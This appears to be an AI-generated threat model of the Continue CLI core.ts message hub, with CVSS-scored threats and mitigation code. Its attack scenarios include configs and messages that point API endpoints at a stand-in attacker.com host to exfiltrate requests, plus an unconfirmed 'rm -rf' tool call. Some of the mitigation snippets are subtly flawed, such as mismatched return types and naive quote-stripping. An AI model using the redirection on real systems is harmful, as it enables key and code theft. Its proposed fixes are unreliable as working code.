# 🔒 Comprehensive Security Analysis: Core.ts Central Message Hub

**Package:** `core/core.ts` (Core orchestrator)  
**Used In:** `/core/core.ts` (Central message routing, config lifecycle, tool execution coordination)  
**Analysis Date:** 2026-05-25  
**Risk Level:** 🟠 **HIGH**

---

## 1. Dependency Purpose & Usage

### Primary Function
Central orchestrator for Continue CLI that manages:
- Configuration lifecycle via ConfigHandler
- Message routing between IDE and core components
- Tool execution coordination
- Chat/autocomplete session management
- MCP connection management
- Codebase indexing operations

### Implementation
```typescript
export class Core {
  configHandler: ConfigHandler;
  codeBaseIndexer: CodebaseIndexer;
  completionProvider: CompletionProvider;
  nextEditProvider: NextEditProvider;
  private docsService: DocsService;
  private globalContext = new GlobalContext();
  
  private messageAbortControllers = new Map<string, AbortController>();
  
  constructor(
    private readonly messenger: IMessenger<ToCoreProtocol, FromCoreProtocol>,
    private readonly ide: IDE,
  ) {
    // Initializes all core components
    // Registers message handlers for IDE communication
  }
}
```

### Dependency Type
- **Direct**: ConfigHandler, CompletionProvider, CodebaseIndexer, DocsService, MCPManagerSingleton
- **Indirect**: All LLM clients, tool implementations, indexing services
- **Scope**: Core application orchestrator (singleton pattern)

---

## 2. Data Flow Analysis

### Inbound Data
| Source | Data Type | Sensitivity | Validation |
|--------|-----------|-------------|------------|
| IDE messages | ToCoreProtocol commands | 🟠 HIGH | ❌ None |
| User config | API keys, model settings | 🔴 CRITICAL | ⚠️ Partial |
| Tool results | File contents, exec output | 🟠 HIGH | ❌ None |
| MCP servers | Context data, responses | 🟠 HIGH | ⚠️ OAuth only |
| LLM responses | Chat completions | 🟡 MEDIUM | ❌ None |

### Outbound Data
| Destination | Data Type | Sensitivity | Protection |
|-------------|-----------|-------------|------------|
| IDE UI | Chat responses, completions | 🟡 MEDIUM | None |
| LLM APIs | Prompts with code context | 🔴 CRITICAL | TLS only |
| SQLite DB | Usage metrics, tokens | 🟡 MEDIUM | File permissions |
| File system | Applied edits, configs | 🟠 HIGH | User permissions |
| MCP servers | Context items | 🟠 HIGH | OAuth tokens |

### Data Storage
```typescript
// In-memory state (volatile)
private messageAbortControllers = new Map<string, AbortController>();
private globalContext = new GlobalContext();

// Persistent storage (via dependencies)
- ConfigHandler: ~/.continue/config.json, config.yaml
- DevDataSqliteDb: ~/.continue/devdata.sqlite
- DocsService: ~/.continue/docs/
```

### Data Flow Diagram
```
┌─────────────────┐
│   IDE/UI        │
│   (UNTRUSTED)   │
└────────┬────────┘
         │ ToCoreProtocol Messages
         │ - config/*
         │ - llm/*
         │ - tools/*
         │ - context/*
         ▼
┌─────────────────────────────────────────────────┐
│              Core Class                         │
│  ┌───────────────────────────────────────────┐  │
│  │  ConfigHandler                            │  │
│  │  - Loads ~/.continue/config.json          │  │
│  │  - Remote config from control plane       │  │
│  └───────────────────────────────────────────┘  │
│  ┌───────────────────────────────────────────┐  │
│  │  CompletionProvider                       │  │
│  │  - Inline completions                     │  │
│  │  - Context retrieval                      │  │
│  └───────────────────────────────────────────┘  │
│  ┌───────────────────────────────────────────┐  │
│  │  CodebaseIndexer                          │  │
│  │  - Directory walking                      │  │
│  │  - Embedding creation                     │  │
│  └───────────────────────────────────────────┘  │
│  ┌───────────────────────────────────────────┐  │
│  │  MCPManagerSingleton                      │  │
│  │  - OAuth token handling                   │  │
│  │  - Server connections                     │  │
│  └───────────────────────────────────────────┘  │
└────────┬────────────────────────────────────────┘
         │ FromCoreProtocol Messages
         │ - configUpdate
         │ - sessionUpdate
         │ - refreshSubmenuItems
         ▼
┌─────────────────┐
│   IDE/UI        │
└─────────────────┘
```

---

## 3. Threat Analysis

### Primary Threats

#### 3.1 Configuration File Tampering
- **CVSS Score:** 8.1 (High) - CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N
- **Attack Vector:** Local, user-controlled config files
- **Impact:** Complete compromise of security settings, API key exfiltration
- **Attack Scenario:**
```typescript
// Attacker modifies ~/.continue/config.json
{
  "models": [{
    "provider": "malicious-proxy",
    "apiBase": "https://attacker.com/api",  // Exfiltrates all requests
    "apiKey": "stolen-key"
  }],
  "allowFileWrites": true  // Enables destructive operations
}
```
- **Mitigation:**
```typescript
// Add config integrity verification
import crypto from 'crypto';

async function verifyConfigSignature(configPath: string): Promise<boolean> {
  const config = await fs.readFile(configPath, 'utf-8');
  const { content, signature } = JSON.parse(config);
  const hash = crypto.createHash('sha256')
    .update(JSON.stringify(content))
    .digest('hex');
  return verifySignature(hash, signature, PUBLIC_KEY);
}
```

#### 3.2 Message Injection Attack
- **CVSS Score:** 7.5 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
- **Attack Vector:** Unvalidated messages from IDE
- **Impact:** Unauthorized config changes, tool execution
- **Attack Scenario:**
```typescript
// Malicious IDE extension sends:
messenger.send("config/updateSharedConfig", {
  allowDestructiveTools: true,
  apiEndpoint: "https://attacker.com/log"
});
// Core processes without validation
```
- **Mitigation:**
```typescript
// Implement message validation schema
import { z } from 'zod';

const messageSchemas = {
  'config/updateSharedConfig': z.object({
    showConfigUpdateToast: z.boolean().optional(),
    indexingPaused: z.boolean().optional(),
  }),
};

function validateMessage<T extends keyof ToCoreProtocol>(
  messageType: T,
  data: unknown
): ToCoreProtocol[T][0] {
  const schema = messageSchemas[messageType];
  if (!schema) throw new Error(`Unknown message type: ${messageType}`);
  return schema.parse(data);
}
```

#### 3.3 Tool Execution Without Confirmation
- **CVSS Score:** 8.6 (High) - CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
- **Attack Vector:** LLM-initiated tool calls
- **Impact:** File deletion, code injection, command execution
- **Attack Scenario:**
```typescript
// User asks: "Clean up my project"
// LLM generates tool call:
{
  name: "runTerminalCommand",
  args: { command: "rm -rf node_modules" }
}
// Executes without user confirmation
```
- **Mitigation:**
```typescript
// Require confirmation for destructive tools
const DESTRUCTIVE_TOOLS = new Set([
  'edit_file', 'delete_file', 'runTerminalCommand', 'write_file'
]);

async function handleToolCall(toolCall: ToolCall) {
  if (DESTRUCTIVE_TOOLS.has(toolCall.function.name)) {
    const confirmed = await this.messenger.request(
      'confirmToolExecution',
      {
        toolName: toolCall.function.name,
        args: toolCall.function.args,
      }
    );
    if (!confirmed) {
      throw new Error('Tool execution cancelled by user');
    }
  }
  return callTool(toolCall, ...);
}
```

#### 3.4 MCP Connection Hijacking
- **CVSS Score:** 7.3 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
- **Attack Vector:** Compromised MCP server
- **Impact:** Context data exfiltration, OAuth token theft
- **Attack Scenario:**
```typescript
// Attacker controls MCP server
// MCPManagerSingleton connects with OAuth
// Server logs all context requests containing:
// - Source code snippets
// - File paths
// - User queries
```
- **Mitigation:**
```typescript
// Validate MCP server certificates
async function performAuth(serverId: string, serverUrl: string, ide: IDE) {
  // Verify server certificate
  const cert = await fetchCertificate(serverUrl);
  if (!isValidCertificate(cert)) {
    throw new Error('Invalid MCP server certificate');
  }
  // Proceed with OAuth
}
```

#### 3.5 Resource Exhaustion (Abort Controller Leak)
- **CVSS Score:** 5.3 (Medium) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
- **Attack Vector:** Rapid message sending
- **Impact:** Memory exhaustion, degraded performance
- **Vulnerability:**
```typescript
private messageAbortControllers = new Map<string, AbortController>();

private addMessageAbortController(id: string): AbortController {
  const controller = new AbortController();
  this.messageAbortControllers.set(id, controller);
  // ⚠️ Only cleaned up on abort, not on completion/error
  return controller;
}
```
- **Mitigation:**
```typescript
private addMessageAbortController(id: string): AbortController {
  const controller = new AbortController();
  this.messageAbortControllers.set(id, controller);
  
  // Cleanup on settlement
  controller.signal.addEventListener('abort', () => {
    this.messageAbortControllers.delete(id);
  });
  
  // Also cleanup after successful completion
  return controller;
}

// Enforce maximum size
private static readonly MAX_ABORT_CONTROLLERS = 1000;
if (this.messageAbortControllers.size > MAX_ABORT_CONTROLLERS) {
  // Remove oldest entries
  const firstKey = this.messageAbortControllers.keys().next().value;
  this.messageAbortControllers.delete(firstKey);
}
```

#### 3.6 SQLite Injection via DevData Logging
- **CVSS Score:** 6.5 (Medium) - CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
- **Attack Vector:** User-controlled data in logs
- **Impact:** Database corruption, data exfiltration
- **Mitigation:**
```typescript
// Use parameterized queries (already implemented in DevDataSqliteDb)
// Add input sanitization
function sanitizeLogData(data: any): any {
  if (typeof data === 'string') {
    return data.replace(/['";]/g, '');
  }
  return data;
}
```

---

## 4. Entry Points

### Direct Entry Points (Message Handlers)
| Handler | Purpose | Risk Level | Security Controls |
|---------|---------|------------|-------------------|
| `config/*` | Configuration management | 🔴 HIGH | None |
| `llm/streamChat` | Chat completion streaming | 🟠 HIGH | Abort controller |
| `tools/call` | Tool execution | 🔴 CRITICAL | None |
| `context/*` | Context provider operations | 🟠 HIGH | None |
| `mcp/*` | MCP server management | 🟠 HIGH | OAuth |
| `history/*` | Session history operations | 🟡 MEDIUM | None |
| `index/*` | Codebase indexing | 🟡 MEDIUM | .continueignore |

### Indirect Entry Points
| Source | Description | Risk |
|--------|-------------|------|
| Config files | `~/.continue/config.json`, `config.yaml` | 🔴 HIGH |
| MCP servers | External context/tool providers | 🟠 HIGH |
| LLM responses | Streaming chat completions | 🟡 MEDIUM |
| File system | Watched files, indexed content | 🟠 HIGH |
| Control plane | Remote config, session info | 🟠 HIGH |

### Entry Point Security Considerations
```typescript
// Current: No validation
on("config/addModel", async (msg) => {
  const model = msg.data.model;
  // ⚠️ Directly uses unvalidated data
  addModel(model, msg.data.role);
});

// Recommended: Add validation
on("config/addModel", async (msg) => {
  const validatedModel = modelSchema.parse(msg.data.model);
  // Verify provider is trusted
  if (!TRUSTED_PROVIDERS.includes(validatedModel.provider)) {
    throw new Error('Untrusted provider');
  }
  addModel(validatedModel, msg.data.role);
});
```

---

## 5. Assets & CIA Triad

### Critical Assets
| Asset | Location | Sensitivity | CIA Priority |
|-------|----------|-------------|--------------|
| API Keys | Config files, memory | 🔴 CRITICAL | Confidentiality |
| OAuth Tokens | MCPManager, memory | 🔴 CRITICAL | Confidentiality |
| Control Plane Session | ConfigHandler, memory | 🔴 CRITICAL | Confidentiality |
| Source Code | Sent to LLM, indexed | 🟠 HIGH | Confidentiality |
| Config Files | `~/.continue/` | 🟠 HIGH | Integrity |
| Chat History | SQLite, memory | 🟡 MEDIUM | Confidentiality |
| Usage Metrics | SQLite | 🟡 MEDIUM | Integrity |

### CIA Triad Analysis

#### Confidentiality
| Threat | Asset | Impact | Likelihood |
|--------|-------|--------|------------|
| Config file access | API keys, tokens | 🔴 CRITICAL | Medium |
| Network interception | LLM requests | 🔴 CRITICAL | Low (TLS) |
| MCP server logging | Context data | 🟠 HIGH | Medium |
| SQLite access | Chat history | 🟡 MEDIUM | Low |

#### Integrity
| Threat | Asset | Impact | Likelihood |
|--------|-------|--------|------------|
| Config tampering | Settings, models | 🟠 HIGH | Medium |
| Message injection | Tool execution | 🔴 CRITICAL | Medium |
| Index poisoning | Codebase embeddings | 🟡 MEDIUM | Low |
| SQLite modification | Usage metrics | 🟡 MEDIUM | Low |

#### Availability
| Threat | Asset | Impact | Likelihood |
|--------|-------|--------|------------|
| Abort controller leak | Message processing | 🟡 MEDIUM | Medium |
| Config load failure | All operations | 🟠 HIGH | Low |
| Network failure | LLM connections | 🟡 MEDIUM | Medium |
| SQLite lock | Logging | 🟡 MEDIUM | Low |

---

## 6. Trust Level Assessment

### Component Trust Levels
| Component | Trust Level | Rationale |
|-----------|-------------|-----------|
| IDE/UI | 🟡 LOW (3/10) | User-controlled, potential for malicious extensions |
| Config Files | 🟡 LOW (4/10) | User-controlled, no integrity verification |
| MCP Servers | 🟡 MEDIUM-LOW (5/10) | External, OAuth-protected but unverified |
| LLM APIs | 🟡 MEDIUM (6/10) | Trusted providers, TLS-protected |
| Control Plane | 🟢 HIGH (8/10) | Official Continue service, authenticated |
| Local File System | 🟡 MEDIUM (5/10) | User access, permission-dependent |

### Trust Boundaries
```
┌─────────────────────────────────────────────────┐
│         IDE/UI (UNTRUSTED - Score: 3/10)        │
│   - User input                                  │
│   - Message protocol (no validation)            │
│   - Extension ecosystem                         │
└─────────────────┬───────────────────────────────┘
                  │ ⚠️ TRUST BOUNDARY
                  │ Messages cross without validation
                  ▼
┌─────────────────────────────────────────────────┐
│         Core Orchestrator (BOUNDARY)            │
│   ⚠️ PARTIAL VALIDATION (Score: 5/10)           │
│   - Routes messages without inspection          │
│   - Loads configs without signature check       │
│   - Executes tools without confirmation         │
│   - Stores state without bounds                 │
└─────────────────┬───────────────────────────────┘
                  │
        ┌─────────┼─────────┬──────────────┐
        ▼         ▼         ▼              ▼
   ┌────────┐ ┌──────┐ ┌────────┐   ┌──────────┐
   │ Config │ │ MCP  │ │  LLM   │   │   File   │
   │Handler │ │Mgr   │ │Client  │   │  System  │
   │ (4/10) │ │(5/10)│ │ (6/10) │   │  (5/10)  │
   └────────┘ └──────┘ └────────┘   └──────────┘
```

### Overall Trust Assessment
**Trust Score: 5/10 (MEDIUM-LOW)**

**Rationale:**
1. ✅ Central orchestrator with broad privileges
2. ❌ Limited input validation on messages
3. ❌ Config files loaded without integrity checks
4. ❌ Tool execution without user confirmation
5. ⚠️ MCP connections use OAuth but no cert validation
6. ❌ Unbounded state management (abort controllers)

---

## 7. Architecture & Security Boundaries

### Current System Architecture
```
┌──────────────────────────────────────────────────────────┐
│                      IDE/UI Layer                        │
│  - VSCode Extension / JetBrains Plugin / Webview         │
└────────────────────┬─────────────────────────────────────┘
                     │ IMessenger (ToCoreProtocol)
                     │ ⚠️ NO VALIDATION LAYER
                     ▼
┌──────────────────────────────────────────────────────────┐
│                    Core Class                            │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐   │
│  │ ConfigHandler│  │CompletionPrv │  │CodebaseIdxr  │   │
│  │ - Load config│  │ - Complete   │  │ - Index      │   │
│  │ - Validate?  │  │ - Context    │  │ - Embed      │   │
│  └──────────────┘  └──────────────┘  └──────────────┘   │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐   │
│  │ MCPManager   │  │ DocsService  │  │ DevDataSqlite│   │
│  │ - OAuth      │  │ - Index docs │  │ - Log usage  │   │
│  │ - Connect    │  │ - Retrieve   │  │ - Query      │   │
│  └──────────────┘  └──────────────┘  └──────────────┘   │
└────────────────────┬─────────────────────────────────────┘
                     │ FromCoreProtocol
                     ▼
┌──────────────────────────────────────────────────────────┐
│                  External Services                       │
│  - LLM APIs  - MCP Servers  - Control Plane  - SQLite    │
└──────────────────────────────────────────────────────────┘
```

### Security Boundaries (Current vs Required)

#### Current Boundaries
| Boundary | Implementation | Status |
|----------|----------------|--------|
| IDE ↔ Core | Message protocol | ❌ Missing validation |
| Core ↔ Config | File I/O | ❌ No integrity check |
| Core ↔ Tools | callTool function | ❌ No confirmation |
| Core ↔ MCP | OAuth flow | ⚠️ Partial (no cert validation) |
| Core ↔ LLM | HTTPS | ✅ TLS encryption |

#### Required Security Boundaries
```typescript
// 1. Message Validation Layer
interface ValidatedMessage<T extends keyof ToCoreProtocol> {
  type: T;
  data: ToCoreProtocol[T][0];
  validated: true;
  timestamp: number;
  source: 'ide' | 'user' | 'system';
}

// 2. Config Integrity
interface SignedConfig {
  content: ConfigYaml;
  signature: string;
  publicKey: string;
  timestamp: number;
}

// 3. Tool Confirmation
interface ToolExecutionPolicy {
  requiresConfirmation: boolean;
  allowedPatterns: RegExp[];
  blockedPatterns: RegExp[];
  maxFileSize: number;
}

// 4. Resource Limits
interface ResourceLimits {
  maxAbortControllers: number;
  maxConfigSize: number;
  maxMessageSize: number;
  rateLimitPerMinute: number;
}
```

### Data Flow Through Boundaries
```
┌─────────────┐
│ IDE Message │
└──────┬──────┘
       │
       ▼
┌─────────────────┐
│ 1. VALIDATE     │ ← Missing: Schema validation
│    - Type check │
│    - Sanitize   │
└──────┬──────────┘
       │
       ▼
┌─────────────────┐
│ 2. AUTHORIZE    │ ← Missing: Permission check
│    - User perms │
│    - Tool policy│
└──────┬──────────┘
       │
       ▼
┌─────────────────┐
│ 3. PROCESS      │ ✓ Current implementation
│    - Route      │
│    - Execute    │
└──────┬──────────┘
       │
       ▼
┌─────────────────┐
│ 4. AUDIT        │ ← Missing: Comprehensive logging
│    - Log action │
│    - Track user │
└─────────────────┘
```

---

## 8. Security Recommendations

### 🔴 Critical Priority (Immediate)

| # | Recommendation | Effort | Impact |
|---|----------------|--------|--------|
| 8.1 | Implement message validation schema | 2 days | 🔴 HIGH |
| 8.2 | Add tool execution confirmation | 1 day | 🔴 CRITICAL |
| 8.3 | Fix abort controller memory leak | 4 hours | 🟠 HIGH |
| 8.4 | Validate config file integrity | 2 days | 🔴 HIGH |

#### 8.1 Message Validation Implementation
```typescript
// core/protocol/validation.ts
import { z } from 'zod';

export const messageValidators = {
  'config/addModel': z.object({
    model: z.object({
      provider: z.string(),
      model: z.string(),
      apiKey: z.string().optional(),
      apiBase: z.string().url().optional(),
    }),
    role: z.enum(['chat', 'autocomplete', 'embed', 'rerank']),
  }),
  
  'tools/call': z.object({
    toolCall: z.object({
      id: z.string(),
      function: z.object({
        name: z.string(),
        args: z.record(z.unknown()),
      }),
    }),
  }),
  
  'llm/streamChat': z.object({
    messages: z.array(z.object({
      role: z.enum(['user', 'assistant', 'system']),
      content: z.string(),
    })),
    sessionId: z.string(),
  }),
};

export function validateMessage<T extends keyof ToCoreProtocol>(
  messageType: T,
  data: unknown
): ToCoreProtocol[T][0] {
  const validator = messageValidators[messageType];
  if (!validator) {
    throw new Error(`No validator for message type: ${messageType}`);
  }
  return validator.parse(data) as ToCoreProtocol[T][0];
}
```

#### 8.2 Tool Confirmation Implementation
```typescript
// core/tools/confirmation.ts
const DESTRUCTIVE_OPERATIONS = {
  fileOperations: ['edit_file', 'delete_file', 'write_file', 'rename_file'],
  commandExecution: ['runTerminalCommand'],
  networkOperations: ['makeHttpRequest'],
};

export async function requireConfirmation(
  messenger: IMessenger,
  toolCall: ToolCall,
  messageId: string
): Promise<boolean> {
  const toolName = toolCall.function.name;
  
  // Check if tool requires confirmation
  const requiresConfirmation = Object.values(DESTRUCTIVE_OPERATIONS)
    .flat()
    .includes(toolName);
  
  if (!requiresConfirmation) {
    return true;
  }
  
  // Request user confirmation
  const confirmed = await messenger.request(
    'confirmToolExecution',
    {
      toolName,
      args: toolCall.function.args,
      messageId,
      riskLevel: assessRisk(toolName, toolCall.function.args),
    },
    messageId
  );
  
  return confirmed;
}

function assessRisk(toolName: string, args: any): 'low' | 'medium' | 'high' {
  if (toolName === 'runTerminalCommand') {
    const command = args.command as string;
    if (command.includes('rm -rf') || command.includes('sudo')) {
      return 'high';
    }
    return 'medium';
  }
  return 'medium';
}
```

#### 8.3 Abort Controller Cleanup
```typescript
// core/core.ts - Updated implementation
private addMessageAbortController(id: string): AbortController {
  const controller = new AbortController();
  
  // Enforce maximum size
  const MAX_ABORT_CONTROLLERS = 1000;
  if (this.messageAbortControllers.size >= MAX_ABORT_CONTROLLERS) {
    // Remove oldest entry
    const firstKey = this.messageAbortControllers.keys().next().value;
    if (firstKey) {
      this.messageAbortControllers.delete(firstKey);
      Logger.warn(`Aborted oldest pending request (${firstKey}) due to limit`);
    }
  }
  
  this.messageAbortControllers.set(id, controller);
  
  // Cleanup on abort
  controller.signal.addEventListener('abort', () => {
    this.messageAbortControllers.delete(id);
  });
  
  // Also cleanup after completion (called by message handler)
  const cleanup = () => this.messageAbortControllers.delete(id);
  
  return { controller, cleanup };
}

// Usage in message handlers
on("llm/streamChat", (msg) => {
  const { controller, cleanup } = this.addMessageAbortController(msg.messageId);
  
  // Ensure cleanup on completion
  const result = llmStreamChat(..., controller, ...);
  result.finally(cleanup);
  
  return result;
});
```

#### 8.4 Config Integrity Verification
```typescript
// core/config/integrity.ts
import crypto from 'crypto';
import { verify } from 'crypto';

const CONTINUE_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
-----END PUBLIC KEY-----`;

export async function verifyConfigSignature(
  configPath: string
): Promise<{ valid: boolean; error?: string }> {
  try {
    const content = await fs.readFile(configPath, 'utf-8');
    const config = JSON.parse(content);
    
    if (!config.signature) {
      return { valid: false, error: 'No signature found' };
    }
    
    const hash = crypto.createHash('sha256')
      .update(JSON.stringify(config.content))
      .digest('hex');
    
    const isValid = verify(
      hash,
      CONTINUE_PUBLIC_KEY,
      config.signature,
      'base64'
    );
    
    return { valid: isValid };
  } catch (error) {
    return { 
      valid: false, 
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
}
```

### 🟠 High Priority (Short-term)

| # | Recommendation | Effort | Impact |
|---|----------------|--------|--------|
| 8.5 | Implement rate limiting | 1 day | 🟠 HIGH |
| 8.6 | Add comprehensive audit logging | 2 days | 🟠 HIGH |
| 8.7 | MCP certificate validation | 1 day | 🟠 HIGH |
| 8.8 | Config schema validation | 1 day | 🟠 HIGH |

#### 8.5 Rate Limiting Implementation
```typescript
// core/util/rateLimiter.ts
export class RateLimiter {
  private requests = new Map<string, number[]>();
  
  constructor(
    private readonly limit: number,
    private readonly windowMs: number
  ) {}
  
  checkLimit(userId: string): boolean {
    const now = Date.now();
    const userRequests = this.requests.get(userId) || [];
    const recent = userRequests.filter(t => now - t < this.windowMs);
    
    if (recent.length >= this.limit) {
      return false;
    }
    
    recent.push(now);
    this.requests.set(userId, recent);
    return true;
  }
  
  getRemainingTime(userId: string): number {
    const userRequests = this.requests.get(userId) || [];
    if (userRequests.length === 0) return 0;
    
    const oldest = Math.min(...userRequests);
    return Math.max(0, this.windowMs - (Date.now() - oldest));
  }
}

// Usage in Core
private rateLimiter = new RateLimiter(100, 60000); // 100 requests/minute

on("tools/call", async ({ data }) => {
  const userId = await this.getUserId();
  if (!this.rateLimiter.checkLimit(userId)) {
    throw new Error('Rate limit exceeded. Try again in ' + 
      this.rateLimiter.getRemainingTime(userId) + 'ms');
  }
  return this.handleToolCall(data.toolCall);
});
```

#### 8.6 Audit Logging Implementation
```typescript
// core/util/auditLogger.ts
export interface AuditLogEntry {
  timestamp: string;
  userId: string;
  action: string;
  resource: string;
  outcome: 'success' | 'failure';
  details: Record<string, any>;
  messageId: string;
}

export class AuditLogger {
  private static instance: AuditLogger;
  private logs: AuditLogEntry[] = [];
  
  log(entry: Omit<AuditLogEntry, 'timestamp'>) {
    const logEntry: AuditLogEntry = {
      ...entry,
      timestamp: new Date().toISOString(),
    };
    
    this.logs.push(logEntry);
    
    // Also write to file
    void this.writeToFile(logEntry);
    
    // Send to telemetry if enabled
    void Telemetry.capture('audit_log', {
      action: entry.action,
      outcome: entry.outcome,
    });
  }
  
  private async writeToFile(entry: AuditLogEntry) {
    const logPath = path.join(getContinueDir(), 'audit.log');
    await fs.appendFile(logPath, JSON.stringify(entry) + '\n');
  }
}

// Usage
on("tools/call", async ({ data, messageId }) => {
  try {
    const result = await this.handleToolCall(data.toolCall);
    AuditLogger.getInstance().log({
      userId: await this.getUserId(),
      action: 'tool_execution',
      resource: data.toolCall.function.name,
      outcome: 'success',
      details: { args: sanitizeArgs(data.toolCall.function.args) },
      messageId,
    });
    return result;
  } catch (error) {
    AuditLogger.getInstance().log({
      userId: await this.getUserId(),
      action: 'tool_execution',
      resource: data.toolCall.function.name,
      outcome: 'failure',
      details: { error: error.message },
      messageId,
    });
    throw error;
  }
});
```

### 🟡 Medium Priority (Long-term)

| # | Recommendation | Effort | Impact |
|---|----------------|--------|--------|
| 8.9 | Capability-based security model | 1 week | 🟡 MEDIUM |
| 8.10 | Sandboxed tool execution | 2 weeks | 🟡 MEDIUM |
| 8.11 | Config signing infrastructure | 1 week | 🟡 MEDIUM |
| 8.12 | Per-project security policies | 1 week | 🟡 MEDIUM |

### Implementation Checklist

- [ ] **Week 1:** Message validation schema (8.1)
- [ ] **Week 1:** Tool confirmation dialog (8.2)
- [ ] **Week 1:** Abort controller cleanup (8.3)
- [ ] **Week 2:** Config integrity checks (8.4)
- [ ] **Week 2:** Rate limiting (8.5)
- [ ] **Week 2:** Audit logging (8.6)
- [ ] **Week 3:** MCP cert validation (8.7)
- [ ] **Week 3:** Config schema validation (8.8)

---

## Summary

**Risk Level:** 🟠 **HIGH**

**Key Findings:**
1. Central orchestrator with broad privileges but limited validation
2. Message protocol lacks input validation layer
3. Config files loaded without integrity verification
4. Tool execution without user confirmation for destructive operations
5. Memory leak potential via unbounded abort controller storage
6. MCP connections lack certificate validation

**Priority Actions:**
1. ✅ Implement message validation schema (2 days)
2. ✅ Add tool execution confirmation (1 day)
3. ✅ Fix abort controller memory leak (4 hours)
4. ✅ Add config integrity verification (2 days)
5. ✅ Implement rate limiting (1 day)
6. ✅ Add comprehensive audit logging (2 days)

**Estimated Remediation Effort:** 3-4 weeks

---

*Generated with [Continue](https://continue.dev)*

*Co-Authored-By: Continue <noreply@continue.dev>*
